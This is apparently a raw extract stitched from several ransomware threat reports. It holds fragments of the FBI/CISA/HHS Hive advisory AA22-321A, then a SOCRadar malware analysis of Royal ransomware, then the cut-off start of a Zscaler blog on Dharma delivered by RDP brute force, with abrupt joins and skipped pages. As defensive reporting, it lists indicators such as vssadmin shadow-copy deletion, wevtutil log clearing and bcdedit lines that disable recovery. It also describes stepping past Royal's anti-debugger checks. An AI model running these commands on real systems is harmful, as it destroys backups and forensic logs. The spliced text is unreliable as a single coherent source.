servers [T1190]:\n•\n•\n•\n\nCVE-2021-31207 - Microsoft Exchange Server Security Feature Bypass Vulnerability\nCVE-2021-34473 - Microsoft Exchange Server Remote Code Execution Vulnerability\nCVE-2021-34523 - Microsoft Exchange Server Privilege Escalation Vulnerability\n\nAfter gaining access, Hive ransomware attempts to evade detention by executing processes to:\n•\n•\n•\n\nIdentify processes related to backups, antivirus/anti-spyware, and file copying and then\nterminating those processes to facilitate file encryption [T1562].\nStop the volume shadow copy services and remove all existing shadow copies via vssadmin\non command line or via PowerShell [T1059] [T1490].\nDelete Windows event logs, specifically the System, Security and Application logs [T1070].\n\nPrior to encryption, Hive ransomware removes virus definitions and disables all portions of Windows\nDefender and other common antivirus programs in the system registry [T1112].\nHive actors exfiltrate data likely using a combination of Rclone and the cloud storage service Mega.nz\n[T1537]. In addition to its capabilities against the Microsoft Windows operating system, Hive\nransomware has known variants for Linux, VMware ESXi, and FreeBSD.\nDuring the encryption process, a file named *.key (previously *.key.*) is created in the root\ndirectory (C:\\ or /root/). Required for decryption, this key file only exists on the machine where it\nwas created and cannot be reproduced. The ransom note, HOW_TO_DECRYPT.txt is dropped into\neach affected directory and states the *.key file cannot be modified, renamed, or deleted, otherwise\nthe encrypted files cannot be recovered [T1486]. The ransom note contains a “sales department”\n.onion link accessible through a TOR browser, enabling victim organizations to contact the actors\nthrough a live chat panel to discuss payment for their files. However, some victims reported receiving\nphone calls or emails from Hive actors directly to discuss payment.\n\nPage 2 of 12 | Product ID: AA22-321A\n\nTLP: CLEAR\n\nTLP:CLEAR\nThe ransom note also threatens victims that a public disclosure or leak site accessible on the TOR\nsite, “HiveLeaks”, contains data exfiltrated from victim organizations who do not pay the ransom\ndemand (see figure 1 below). Additionally, Hive actors have used anonymous file sharing sites to\ndisclose exfiltrated data (see table 1 below).\n\nFigure 1: Sample Hive Ransom Note\nTable 2: Anonymous File Sharing Sites Used to Disclose Data\nhttps://anonfiles[.]com\nhttps://mega[.]nz\nhttps://send.exploit[.]in\nhttps://ufile[.]io\nhttps://www.sendspace[.]com\n\nPage 3 of 12 | Product ID: AA22-321A\n\nTLP: CLEAR\n\nTLP:CLEAR\n\nhttps://privatlab[.]net\nhttps://privatlab[.]com\n\nOnce the victim organization contacts Hive actors on the live chat panel, Hive actors communicate\nthe ransom amount and the payment deadline. Hive actors negotiate ransom demands in U.S.\ndollars, with initial amounts ranging from several thousand to millions of dollars. Hive actors demand\npayment in Bitcoin.\nHive actors have been known to reinfect—with either Hive ransomware or another ransomware\nvariant—the networks of victim organizations who have restored their network without making a\nransom payment.\n\nIndicators of Compromise\nThreat actors have leveraged the following IOCs during Hive ransomware compromises. Note: Some\nof these indicators are legitimate applications that Hive threat actors used to aid in further malicious\nexploitation. FBI, CISA, and HHS recommend removing any application not deemed necessary for\nday-to-day operations. See tables 2−3 below for IOCs obtained from FBI threat response\ninvestigations as recently as November 2022.\nTable 2: Known IOCs as of November 2022\nKnown IOCs - Files\nHOW_TO_DECRYPT.txt typically in directories with encrypted files\n*.key typically in the root directory, i.e., C:\\ or /root\nhive.bat\nshadow.bat\nasq.r77vh0[.]pw - Server hosted malicious HTA file\nasq.d6shiiwz[.]pw - Server referenced in malicious regsvr32 execution\nasq.swhw71un[.]pw - Server hosted malicious HTA file\nasd.s7610rir[.]pw - Server hosted malicious HTA file\nWindows_x64_encrypt.dll\nWindows_x64_encrypt.exe\nWindows_x32_encrypt.dll\nWindows_x32_encrypt.exe\nLinux_encrypt\nEsxi_encrypt\n\nPage 4 of 12 | Product ID: AA22-321A\n\nTLP: CLEAR\n\nTLP:CLEAR\nKnown IOCs – Events\nSystem, Security and Application Windows event logs wiped\nMicrosoft Windows Defender AntiSpyware Protection disabled\nMicrosoft Windows Defender AntiVirus Protection disabled\nVolume shadow copies deleted\nNormal boot process prevented\nKnown IOCs – Logged Processes\nwevtutil.exe cl system\nwevtutil.exe cl security\nwevtutil.exe cl application\nvssadmin.exe delete shadows /all /quiet\nwmic.exe SHADOWCOPY /nointeractive\nwmic.exe shadowcopy delete\nbcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\nTable 3: Potential IOC IP Addresses as of November 2022\nNote: Some of these observed IP addresses are more than a year old.

Prioritize patching VPN servers, remote access software, virtual machine software,\nand known exploited vulnerabilities. Consider leveraging a centralized patch management\nsystem to automate and expedite the process.\nRequire phishing-resistant MFA for as many services as possible—particularly for webmail,\nVPNs, accounts that access critical systems, and privileged accounts that manage backups.\nIf used, secure and monitor RDP.\no Limit access to resources over internal networks, especially by restricting RDP and\nusing virtual desktop infrastructure.\no After assessing risks, if you deem RDP operationally necessary, restrict the originating\nsources and require MFA to mitigate credential theft and reuse.\no If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other\nmeans to authenticate and secure the connection before allowing RDP to connect to\ninternal devices.\no Monitor remote access/RDP logs, enforce account lockouts after a specified number of\nattempts to block brute force campaigns, log RDP login attempts, and disable unused\nremote access/RDP ports.\no Be sure to properly configure devices and enable security features.\no Disable ports and protocols not used for business purposes, such as RDP Port\n3389/TCP.\nMaintain offline backups of data, and regularly maintain backup and restoration. By instituting\nthis practice, the organization ensures they will not be severely interrupted, and/or only have\nirretrievable data.\nEnsure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers\nthe entire organization’s data infrastructure. Ensure your backup data is not already infected.\nMonitor cyber threat reporting regarding the publication of compromised VPN login credentials\nand change passwords/settings if applicable.\n\nPage 8 of 12 | Product ID: AA22-321A\n\nTLP: CLEAR\n\nTLP:CLEAR\n• Install and regularly update anti-virus or anti-malware software on all hosts.\n• Enable PowerShell Logging including module logging, script block logging and transcription.\n• Install an enhanced monitoring tool such as Sysmon from Microsoft for increased logging.\n• Review the following additional resources.\no The joint advisory from Australia, Canada, New Zealand, the United Kingdom, and the\nUnited States on Technical Approaches to Uncovering and Remediating Malicious\nActivity provides additional guidance when hunting or investigating a network and\ncommon mistakes to avoid in incident handling.\no The Cybersecurity and Infrastructure Security Agency-Multi-State Information Sharing\n& Analysis Center Joint Ransomware Guide covers additional best practices and ways\nto prevent, protect, and respond to a ransomware attack.\no StopRansomware.gov is the U.S. Government’s official one-stop location for resources\nto tackle ransomware more effectively.\nIf your organization is impacted by a ransomware incident, FBI, CISA, and HHS recommend the\nfollowing actions.\n•\n\n•\n\n•\n\nIsolate the infected system. Remove the infected system from all networks, and disable the\ncomputer’s wireless, Bluetooth, and any other potential networking capabilities. Ensure all\nshared and networked drives are disconnected.\nTurn off other computers and devices. Power-off and segregate (i.e., remove from the\nnetwork) the infected computer(s). Power-off and segregate any other computers or devices\nthat share a network with the infected computer(s) that have not been fully encrypted by\nransomware. If possible, collect and secure all infected and potentially infected computers and\ndevices in a central location, making sure to clearly label any computers that have been\nencrypted. Powering-off and segregating infected computers and computers that have not\nbeen fully encrypted may allow for the recovery of partially encrypted files by specialists.\nSecure your backups. Ensure that your backup data is offline and secure. If possible, scan\nyour backup data with an antivirus program to check that it is free of malware.\n\nIn addition, FBI, CISA, and HHS urge all organizations to apply the following recommendations to\nprepare for, mitigate/prevent, and respond to ransomware incidents.\n\nPreparing for Cyber Incidents\n•\n\n•\n•\n\nReview the security posture of third-party vendors and those interconnected with your\norganization. Ensure all connections between third-party vendors and outside software or\nhardware are monitored and reviewed for suspicious activity.\nImplement listing policies for applications and remote access that only allow systems to\nexecute known and permitted programs under an established security policy.\nDocument and monitor external remote connections. Organizations should document\napproved solutions for remote management and maintenance, and immediately investigate if\nan unapproved solution is installed on a workstation.\n\nPage 9 of 12 | Product ID: AA22-321A\n\nTLP: CLEAR\n\nTLP:CLEAR\n• Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary\ndata and servers in a physically separate, segmented, and secure location (i.e., hard drive,\nstorage device, the cloud).\n\nIdentity and Access Management\n•\n\nRequire all accounts with password logins (e.g., service account, admin accounts, and\ndomain admin accounts) to comply with National Institute of Standards and Technology\n(NIST) standards for developing and managing password policies.\no Use longer passwords consisting of at least 8 characters and no more than 64\ncharacters in length.\no Store passwords in hashed format using industry-recognized password managers.\no Add password user “salts” to shared login credentials.\no Avoid reusing passwords.\no Implement multiple failed login attempt account lockouts.\no Disable password “hints.”\no Refrain from requiring password changes more frequently than once per year unless a\npassword is known or suspected to be compromised.\nNote: NIST guidance suggests favoring longer passwords instead of requiring regular\nand frequent password resets. Frequent password resets are more likely to result in\nusers developing password “patterns” cyber criminals can easily decipher.\no Require administrator credentials to install software.\n\n•\n\nRequire phishing-resistant multifactor authentication for all services to the extent\npossible, particularly for webmail, virtual private networks, and accounts that access critical\nsystems.\nReview domain controllers, servers, workstations, and active directories for new and/or\nunrecognized accounts.\nAudit user accounts with administrative privileges and configure access controls according\nto the principle of least privilege.\nImplement time-based access for accounts set at the admin level and higher. For\nexample, the Just-in-Time (JIT) access method provisions privileged access when needed\nand can support enforcement of the principle of least privilege (as well as the Zero Trust\nmodel). This is a process where a network-wide policy is set in place to automatically disable\nadmin accounts at the Active Directory level when the account is not in direct need. Individual\nusers may submit their requests through an automated process that grants them access to a\nspecified system for a set timeframe when they need to support the completion of a certain\ntask.\n\n•\n•\n•\n\nProtective Controls and Architecture\n•\n\nSegment networks to prevent the spread of ransomware. Network segmentation can help\nprevent the spread of ransomware by controlling traffic flows between—and access to—\nvarious subnetworks and by restricting adversary lateral movement.\n\nPage 10 of 12 | Product ID: AA22-321A\n\nTLP: CLEAR\n\nTLP:CLEAR\n• Identify, detect, and investigate abnormal activity and potential traversal of the\nindicated ransomware with a networking monitoring tool.

Paying a ransom may\nembolden adversaries to target additional organizations, encourage other criminal actors to engage in\nthe distribution of ransomware, and/or fund illicit activities. Paying the ransom also does not\nguarantee that a victim’s files will be recovered. However, the FBI, CISA, and HHS understand that\nwhen businesses are faced with an inability to function, executives will evaluate all options to protect\ntheir shareholders, employees, and customers. Regardless of whether you or your organization\ndecide to pay the ransom, the FBI, CISA, and HHS urge you to promptly report ransomware incidents\nto your local FBI field office, or to CISA at report@cisa.gov or (888) 282-0870. Doing so provides\ninvestigators with the critical information they need to track ransomware attackers, hold them\naccountable under US law, and prevent future attacks.\nThe FBI may seek the following information that you determine you can legally share, including:\n•\n\nRecovered executable files\n\nPage 11 of 12 | Product ID: AA22-321A\n\nTLP: CLEAR\n\nTLP:CLEAR\n• Live random access memory (RAM) capture\n• Images of infected systems\n• Malware samples\n• IP addresses identified as malicious or suspicious\n• Email addresses of the attackers\n• A copy of the ransom note\n• Ransom amount\n• Bitcoin wallets used by the attackers\n• Bitcoin wallets used to pay the ransom\n• Post-incident forensic reports\n\nDISCLAIMER\nThe information in this report is being provided “as is” for informational purposes only.

In 2021, several high-profile ransomware\nattacks made headlines, such as the attack on the Colonial Pipeline. This attack resulted in the temporary shutdown of the pipeline, which\ncaused fuel shortages and panic buying in some areas. This incident could have led to a crisis within the country. \n\nIn addition to targeting large companies, ransomware attacks are frequently directed at small businesses, hospitals, and other organizations\nwith less robust cybersecurity measures.\n\nIn November 2022, the Royal Ransomware group was the most actively operating ransomware group, and the group is continuing to damage\norganizations.\n\nhttps://socradar.io/dark-web-profile-royal-ransomware/\nhttps://socradar.io/from-fuel-shortages-to-gas-hikes-how-the-colonial-pipeline-co-fell-victim-to-a-ransomware-attack/\nhttps://socradar.io/verizon-2022-dbir-all-sizes-of-businesses-suffer-from-ransomware/\n\n\n2/24\n\nDaily Dark Web’s infographic of\n\nRansomware activities in November 2022 (Source: Daily Dark Web) \n\nWho is Royal Ransomware Group? \n\nRoyal Ransomware strain was first detected on DEV-0569’s (threat actor) operations in September 2022. The actors behind the Royal are\ncomposed of experienced individuals from other ransomware operations, such as Conti, and operate independently without any affiliates.\nRoyal Ransomware group operates professionally rather than adopting Ransomware-as-a-Service as most other groups work. \n\nAccording to SOCRadar’s dark web team’s findings, Royal Ransomware primarily targets the manufacturing industry. It could be because of\nthe broad attack surface area, such as various specialized equipment and managed software used in the field. Plus, the limited IT and\nsecurity workforce may have led to factories becoming easy targets for cybercriminals. In addition, the probability of getting paid the ransom is\nhigh for ransomware groups considering that the extended downtime will increase the damage to facilities.\n\nhttps://www.microsoft.com/en-us/security/blog/2022/11/17/dev-0569-finds-new-ways-to-deliver-royal-ransomware-various-payloads/\nhttps://socradar.io/conti-ransomware-ended-they-operate-with-other-groups-now/\nhttps://socradar.io/what-is-ransomware-as-a-service-raas/\nhttps://socradar.io/manufacturing-industry-pays-the-highest-average-ransom-at-2-04m/\n\n\n3/24\n\nTargeted industries of Royal\n\nRansomware\n\nHow Royal Ransomware Group Attacks? \n\nAccording to BleepingComputer, Royal Ransomware attacks used a technique called callback phishing, which involves tricking victims into\nbelieving they need to take some action, such as returning a phone call or opening an email attachment.\n\nhttps://www.bleepingcomputer.com/news/security/new-royal-ransomware-emerges-in-multi-million-dollar-attacks/\nhttps://socradar.io/a-new-rising-social-engineering-trend-callback-phishing/\n\n\n4/24\n\nAn example of Royal’s callback phishing mail (Source:\n\nBleeping Computer) \nWhen the victim reaches Royal, the group uses social engineering techniques to persuade the victim to install their remote access software -a\nmalware downloader that poses legitimate applications like Zoom and Microsoft Teams– and get initial access to the network of the victim’s\norganization. \n\nhttps://socradar.io/top-5-tactics-threat-actors-use-for-initial-access/\n\n\n5/24\n\nDiagram of DEV-0569‘s attack chain, which is a threat actor that uses Royal Ransomware actively (Source: Microsoft)\nSOCRadar Researchers took a sample and analyzed Royal Ransomware, which is detailed in the “Analysis of Royal Ransomware” section\nbelow. \n\nIn addition, the group generally uses the double-extortion method, which means they also exfiltrate sensitive data before encrypting it for\nransom. Also, the group’s ransom demand ranges between $250,000 to over $2 million. \n\nWhich Countries Did Royal Ransomware Target? \n\nRoyal ransomware group’s victims are commonly from Europe and the American continent.\n\nAffected countries by Royal Ransomware \nSOCRadar researchers analyzed about 70 observed claims from Royal Ransomware since September 2022 and found that around 69% of the\nattacks were made against organizations in the United States.\n\nhttps://www.microsoft.com/en-us/security/blog/2022/11/17/dev-0569-finds-new-ways-to-deliver-royal-ransomware-various-payloads/\n\n\n6/24\n\nRoyal Ransomware’s percentage distribution of target countries from its latest attacks\n\nFindings on Royal Ransomware \n\nSince it has damaged about 75 organizations and continues its operations actively, SOCRadar researchers browsed open sources. They\nexamined the Royal Ransomware sample obtained from the Malware bazaar platform to learn which activities are happening after it starts\nworking on infected systems. The findings of the sample can be seen below: (You can find the IOCs of Royal Ransomware used in the\nanalysis at the Appendixes section) \n\nSeveral anti-analysis techniques were encountered when the Royal Ransomware ran step by step. After these stages were passed, it was\nseen that the process compares three arguments: “-path,” “-id,” and “-ep.”\n\nThe“-id” parameter could be for the victim ID, “-path” could be for the directory path, and the “-ep” parameter, as we observed, refers to\nthe encryption percentage of the file.\n\nhttps://bazaar.abuse.ch/sample/f484f919ba6e36ff33e4fb391b8859a94d89c172a465964f99d6113b55ced429/\n\n\n7/24\n\n“-path”, “-id”, and “-ep” parameters used\n\nin Royal Ransomware \nAlso, the program skips the encryption process for all the files with extensions “dll,” “bat,” “royal,” or “exe.“\n\nSkipping files with extensions dll, bat, exe, and royal.\n\nhttps://socradar.io/lets-start-from-the-beginning-what-is-encryption/\n\n\n8/24\n\nSkipping files with extensions dll, bat, exe, and\n\nroyal.\nThe program encrypts files using AES and IV and changes the extension of files with “.royal.”\n\nAES and IV key generation processes (Source: TrendMicro)\n\nWhen the encryption process starts, the first “README.TXT” file, which contains the ransom note, is created under the C:\\Program Files\ndirectory. \n\nFirst file that contains\n\nransom note observed in C:\\Program Files\n\nhttps://www.trendmicro.com/en_us/research/22/l/conti-team-one-splinter-group-resurfaces-as-royal-ransomware-wit.html\n\n\n9/24\n\nRoyal’s Ransom note (Source: BleepingComputer)\nThe URL link in the ransom note directs the victim to the Contact page of Royal:\n\nContact form page of Royal\nThe Royal group uses another page to share their claims:\n\nhttps://www.bleepingcomputer.com/news/security/new-royal-ransomware-emerges-in-multi-million-dollar-attacks/\n\n\n10/24\n\nRoyal’s page that they share their claims and links of their exfiltrated files\nSecurity researchers observed that the group first used BlackCat‘s encryptors and Zeon’s ransom notes.

The group mainly uses\ncallback phishing to get initial access to its victims. Organizations should provide cybersecurity awareness training for their\nemployees to prevent attacks from callback phishing.\n\nRoyal ransomware is a recent threat that appeared in 2022 and was particularly active during recent months. The ransomware deletes all\nVolume Shadow Copies and avoids specific file extensions and folders. It encrypts the network shares found in the local network and the local\ndrives. A parameter called “-id” that identifies the victim and is also written in the ransom note must be specified in the command line.\n\nThe files are encrypted using the AES algorithm (OpenSSL), with the key and IV being encrypted using the RSA public key that is hard-coded\nin the executable. The malware can fully or partially encrypt a file based on the file’s size and the “-ep” parameter. The extension of the\nencrypted files are changed to “.royal.”\n\nRansomware Composition\n\nWhen run as an administrator, Royal ransomware runs two sub-processes and terminates them after. Terminations could be because the tool\nused for analysis may be detected by the parent process, or it could terminate itself by detecting the virtual machine environment. This will be\nanswered in the static analysis section.\n\nThe findings gathered using Sysmon, Process Monitor and Event Viewer can be seen in the table below:\n\n\n\n\nProcess Name Command Line\n\nvssadmin.exe delete shadows /all /quiet\n\nconhost.exe \\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1\n\nslui.exe \\??\\C:\\WINDOWS\\System32\\slui.exe -Embedding\n\nvssadmin.exe\n\nVolume Shadow Copy Service or VSS is a Windows service that allows taking manual or automatic backup copies (snapshots) of computer\nfiles or volumes, even when they are in use. It is executed as a Windows service called the Volume Shadow Copy service.\n\nconhost.exe\n\nMicrosoft provides the conhost.exe (Console Windows Host) file and is usually legitimate and completely safe. conhost.exe needs to run to\nallow Command Prompt to work with Windows Explorer. One of its features is that it gives you the ability to drag and drop files/folders straight\ninto Command Prompt.\n\nhttps://www.virustotal.com/gui/file/f484f919ba6e36ff33e4fb391b8859a94d89c172a465964f99d6113b55ced429\n\n\n12/24\n\nStatic Analysis\n\nOverview\n\nFile Name Royal.exe\n\nFile Size 3.013 KB\n\nFile Type Win32.exe\n\nMD5 df0b88dafe7a65295f99e69a67db9e1b\n\nSHA-1 db3163a09eb33ff4370ad162a05f4b2584a20456\n\nSHA-256 f484f919ba6e36ff33e4fb391b8859a94d89c172a465964f99d6113b55ced429\n\nThe ransomware was written in C++ and was not packed even with an entropy value of ‘6.60303’, which is thought to be 82% packed malware\nfirst. Let’s examine the strings and see if we can find anything during the analysis. You can see the entropy value in the screenshot below.\n\nWhen we searched for HTTP in the strings, we found an output. This onion URL may be the contact address of Royal Ransomware.\n\nThe first function call at the program’s start is shown in the screenshot below:\n\n\n\n13/24\n\nAnti-Debugger control is provided with “IsDebuggerPresent” API. If the EAX register takes 1 as a value, the program will close itself, and it is\nnot possible to debug with the analysis tools; that’s why it is necessary to change it to 0 to run the program without closing. The anti-Debugger\nBypass technique will be done during Dynamic analysis.\n\n\n\n14/24\n\nThe function related to the OpenSSL and RC4 encryption stage is given in the image below:\n\nThe ransomware imports a hard-coded RSA public key. The OpenSSL library will be used to encrypt the files using the AES algorithm, with the\nAES key being encrypted using the RSA public key:\n\n\n\n15/24\n\nDynamic Analysis\n\nWhen executing the Royal ransomware, it takes three arguments. In this section, we will start the dynamic analysis phase by showing what\nthey are and for what they are used.\n\nWhen we run the program, it performs backup deletion -with child processes using the parameters we specified in the Ransomware\nComposition section- with vssadmin.exe and conhost.exe.\n\nConhost.exe must be run to allow Command Prompt to work with Windows Explorer. One of its features is that it will enable you to drag and\ndrop files/folders directly into Command Prompt.\n\nANY.RUN Process Graph\n\nBehavioral Information Reads the computer name Checks supported languages The process checks LSA protection\n\nroyal.exe x PID: 1568 x\n\nvssadmin.exe x x PID: 4768\n\nconhost.exe PID: 4892 PID: 4892 PID: 4892\n\nslui.exe x x PID: 1672\n\nWhen we examined the network activity, we could not find any interaction with blacklist IP addresses. All requested domain addresses are\nlegal addresses and whitelist IP addresses.\n\nSince it is a 64-bit program, let’s run it step by step by marking the relevant parts using x64dbg in the virtual environment.\n\n\n\n16/24\n\nDuring the Debugger, when we try to move forward by putting a breakpoint on a few specific APIs, the program closes itself and performs the\nterminate operation. It is clearly understood that Anti-Analysis techniques, which we see in the Static analysis section, are used.\n\nCommand line arguments:\n\n– path: The path to be encrypted.\n\n– ep: The number that represents the percentage of the file that will be encrypted.\n\n– id: A 32-digit array.\n\nRe-examined code part where the parameters are run with Ghidra can be found below:\n\n\n\n17/24\n\nAnti-Analysis Section\n\nWe saw the EAX Register value as 1 for IsDebuggerPresent, an important API that we constantly encounter in malware and will make the\nanalyst’s job more difficult. Let’s check again with Ghidra and start looking at what we can do for an anti-analysis bypass.\n\nAs we will see in the screenshot below, if we directly pass the function call made at the base address “00007FF6FDE0296D”, the program\nperforms the terminate operation.\n\n\n\n18/24\n\nLet’s skip the executing process by changing the RIP address before it terminates the process using the function call and continue exploring it.\n\nWe’ve detected another function call that performs another terminate operation “00007FF6FDE029CF”.\n\nLet’s perform the previous RIP address change at this stage as well.\n\nIt repeats the same actions. Now let’s start reviewing the parts we skipped. After we got through the Anti-Analysis stages, we continued\nmonitoring the program’s operation, as seen in the image below. Once the backups have been deleted, Royal ransomware will set its exclusion\npaths (the files or directories spared from file encryption). The following file extensions will be excluded from being encrypted:\n\n.exe, .dll, .bat, .lnk, README.TXT, .royal\n\n\n\n19/24\n\nNext, the ransomware will set the list of directories excluded from the encryption process. These directories are the ones that contain the\nfollowing strings:\n\n– Windows, RoyalPreflogs, Tor Browser, Boot $recycle.bin, Windows.old, $windows.~ws, $windows.~bt, Mozilla, Google.\n\nNetwork Activity\n\nRansomware will scan the network interfaces and, if possible, retrieve the different IP addresses for the target machine/machines using the\n“GetIpAddrTable” API call. It will specifically search for IP addresses that start with “192.10.100./ 172.”\n\nRoyal ransomware will establish a socket using the API WSASocketW and associate it with a completion port using CreateIoCompletionPort. It\nthen will use the API call tones to set the port to SMB and eventually try to connect to the instructed IP addresses via the LPFN_CONNECTEX\ncallback function.\n\nRansomware will enumerate the shared resources of the given IP addresses using the API called NetShareEnum. If a shared resource is one\nof “\\\\<IP_Address>\\ADMIN$” or “\\\\<IP_Address>\\IPC$”, the ransomware will not encrypt it.\n\nEncryption\n\nRoyal ransomware’s encryption is multi-threaded. To choose the number of running threads, the ransomware will use the API call\nGetNativeSystemInfo to collect the number of processors in a machine. It will then multiply the result by two and create the appropriate number\nof threads accordingly. Next, the ransomware will set the RSA public key, embedded in the binary in plain text and used for encrypting the AES\nkey.\n\nRSA Public Key: —–BEGIN RSA PUBLIC KEY—–\n\\nMIICCAKCAgEAuWfX+pJCUCKc9xsWLVHpCpw6TL20HG/Vk4vF3GYlr6HltX7BMRfA\\n7oGyMztNb37xW66NX+uxHghrX3+sm23yJmSfres\n\n\n\n20/24\n\nRegarding partial encryption, Royal ransomware gives the ransomware operator a more flexible solution for evading detection than most\nransomware. We assume this flexibility and the evasion potential it enables was a design goal for the creators of Royal ransomware.\n\nLatest Attacks of the Group \n\nRansomware attacks on the healthcare industry increased by 81.1% in 2022 compared to 2021. Also, Health Sector Cybersecurity\nCoordination Center (HC3) draws attention to this issue in its latest analysis of Royal Ransomware. Some recent attacks made in the\nhealthcare industry, such as compromising the Northwest Michigan Health Services and Happy Sapiens Dental firms, are made from Royal\nRansomware. The group may likely target this sector more often in the future.\n\nRoyal’s post about the Happy Sapiens\n\nDental\n\nhttps://socradar.io/5-lessons-learned-from-healthcare-industry-cyberattacks-in-2022/\nhttps://www.hhs.gov/sites/default/files/royal-ransomware-analyst-note.pdf\n\n\n21/24\n\nOne of the Royal’s most significant claims is the compromise of INTRADO, an American telecommunications company with more than 10K\nemployees. It is unknown which data was stolen, but according to Royal, they exfiltrated internal documents, passports, and driver’s licenses\nof INTRADO’s employees.\n\nRoyal’s\n\nclaim about INTRADO\nCountries affected by Royal Ransomware over time, based on our findings from around 70 observations, can be seen below:\n\nTimeline of Royal Ransomware attacks\nThe SOCRadar dark web team constantly monitors ransomware activities and reports in the SOCRadar Dark Web News panel.\n\n\n\n22/24\n\nSOCRadar’s Dark Web News panel under the Cyber Threat Intelligence module\n\nConclusion \n\nThe attacks of this group occur more often, and their pattern should be kept in mind to be safe. The group mainly uses callback phishing to get\ninitial access to its victims. Organizations should provide cybersecurity awareness training for their employees to prevent attacks from callback\nphishing.\n\nEmployees should: \n\nBe cautious of unsolicited calls, texts, or emails, especially if it asks to provide personal information or login credentials. \nBe cautious when providing personal information online. \nDo not click links or download attachments from unknown sources. \nUse strong passwords and assist it using 2FA or MFA solutions. \nKeep their systems up to date, which will help protect the devices from vulnerabilities that could be exploited. \n\nOrganizations -especially those operating in the Manufacturing and Healthcare sectors- should: \n\nRegularly update and patch software and systems. \nRegularly back up important data and test the backups. \nUse network segmentation and access controls to limit attackers’ movement within the network.\nDeploy and regularly update security software. (e.g., firewalls and antivirus) \n\nThese measures can help reduce the risk of Royal Ransomware, but no security measures are foolproof. It is vital to have a response plan in\nplace in case of an attack.\n\nAppendixes\n\nAppendix 1.\n\nRoyal Ransomware (used sample’s information)\n\nMD5:df0b88dafe7a65295f99e69a67db9e1b\nSHA-1:db3163a09eb33ff4370ad162a05f4b2584a20456\nSHA-256: f484f919ba6e36ff33e4fb391b8859a94d89c172a465964f99d6113b55ced429\nFile Type:Win32 EXE\n\nIOCs of Royal Ransomware:\n\n104.86.182.8:443 (TCP)\n20.99.133.109:443 (TCP)\n20.99.184.37:443 (TCP)\n23.216.147.64:443 (TCP)\n\nhttps://socradar.io/building-cybersecurity-awareness-for-organizations/\n\n\n23/24\n\n23.216.147.76:443 (TCP)\na83f:8110:0:0:64ca:1f00:0:0:53 (UDP)\na83f:8110:1749:73ff:1749:73ff:1a4b:73ff:53 (UDP)\na83f:8110:8401:0:2075:2cc:8401:0:53 (UDP)\nhxxp[:]//royal2xthig3ou5hd7zsliqagy6yygk2cdelaxtni2fyad6dpmpxedid[.]onion/%s\nREADME.txt\n\nAppendix 2.\n\nMITRE ATT&CK Techniques\n\nTechniques Name\n\nT1059 Command and Scripting Interpreter\n\nT1106 Native API\n\nT1559.001 Inter-Process Communication: Component Object Model\n\nT1129 Shared Modules\n\nT1055 Process Injection\n\nT1134 Access Token Manipulation\n\nT1134.001 Access Token Manipulation: Token Impersonation/Theft\n\nT1070.004 Indicator Removal: File Deletion\n\nT1622 Debugger Evasion\n\nT1027 Obfuscated Files or Information\n\nT1140 Deobfuscate/Decode Files or Information\n\nT1082 System Information Discovery\n\nT1622 Debugger Evasion\n\nT1057 Process Discovery\n\nT1083 File and Directory Discovery\n\nT1135 Network Share Discovery\n\nT1518 Software Discovery\n\nT1560 Archive Collected Data\n\nT1090 Proxy\n\nhttps://attack.mitre.org/techniques/T1059/\nhttps://attack.mitre.org/techniques/T1106/\nhttps://attack.mitre.org/techniques/T1559/001/\nhttps://attack.mitre.org/techniques/T1129/\nhttps://attack.mitre.org/techniques/T1055/\nhttps://attack.mitre.org/techniques/T1134/\nhttps://attack.mitre.org/techniques/T1134/001/\nhttps://attack.mitre.org/techniques/T1070/004/\nhttps://attack.mitre.org/techniques/T1622/\nhttps://attack.mitre.org/techniques/T1027/\nhttps://attack.mitre.org/techniques/T1140/\nhttps://attack.mitre.org/techniques/T1082/\nhttps://attack.mitre.org/techniques/T1622/\nhttps://attack.mitre.org/techniques/T1057/\nhttps://attack.mitre.org/techniques/T1083/\nhttps://attack.mitre.org/techniques/T1135/\nhttps://attack.mitre.org/techniques/T1518/\nhttps://attack.mitre.org/techniques/T1560/\nhttps://attack.mitre.org/techniques/T1090/\n\n\n24/24\n\nhttps://socradar.io/free-edition/\nUse SOCRadar® FOR FREE 1 YEAR\n\nWith SOCRadar® Free Edition, you'll be able to:\n\nGet Free Access —>\n\n24/24",

      "plain_text": "1/5\n\nRansomware Delivered Using RDP Brute-Force Attack\nzscaler.com/blogs/security-research/ransomware-delivered-using-rdp-brute-force-attack\n\nZscaler ThreatLabZ recently published a report on the 2020 State of Public Cloud Security\nthat showed security misconfiguration to be the leading cause of cyberattacks against\npublic cloud infrastructure. In this blog, we will look at one of the commonly abused security\nmisconfigurations—the RDP service port left open to the internet—and how cybercriminals\nabuse it. \n\nBrute-forcing RDP (Remote Desktop Protocol) is the most common method used by threat\nactors attempting to gain access to Windows systems and execute malware. The reason is\nsimple: In our public cloud threat research, we have observed that 70 percent of systems\nkeep RDP ports open in the public cloud. Threat actors scan for these publicly open RDP\nports to conduct distributed brute-force attacks. Systems that use weak credentials are easy\ntargets, and, once compromised, attackers sell access to the hacked systems on the dark\nweb to other cybercriminals.\n\nRansomware groups such as SamSam and Dharma have been spreading almost\nexclusively via RDP for years. In this case study, we will look at Dharma ransomware\nattacks. Dharma, also known as Crysis, has been distributed under a ransomware-as-a-\nservice (RaaS) model since 2016. Its source code was up for sale in March 2020, making it\navailable to a wider spectrum.\n\n  \n\nInfection chain\n\nAttackers use open-source port-scanning tools to scan for exposed RDP ports online and\nthen try to gain access to a system using brute-force tools or stolen credentials purchased\nfrom the dark web. After attackers gain access to the target system, they go on to make the\n\nhttps://www.zscaler.com/blogs/security-research/ransomware-delivered-using-rdp-brute-force-attack\nhttps://www.zscaler.com/blogs/security-research/2020-state-cloud-insecurity\n\n\n2/5\n\nsystem vulnerable by deleting backups, disabling antivirus software, and changing\nconfiguration settings. Once the security is disabled and the network vulnerable, attackers\ndeliver malware payloads. The process involves installing ransomware, using infected\nmachines to distribute spam, deploying keyloggers, or installing backdoors to be used for\nfuture attacks.\n\nThe below figure shows the infection cycle of Dharma ransomware delivered via RDP brute-\nforce attack.\n\nFigure 1: Infection chain of RDP brute-force attack delivers Dharma ransomware\n\nOnce the attacker gains access to the machine, the following files are uploaded:\n\n%temp%\\ns.exe – Network enumeration/scanning tool\n\n%programfiles%\\process hacker\\ – Process hacker 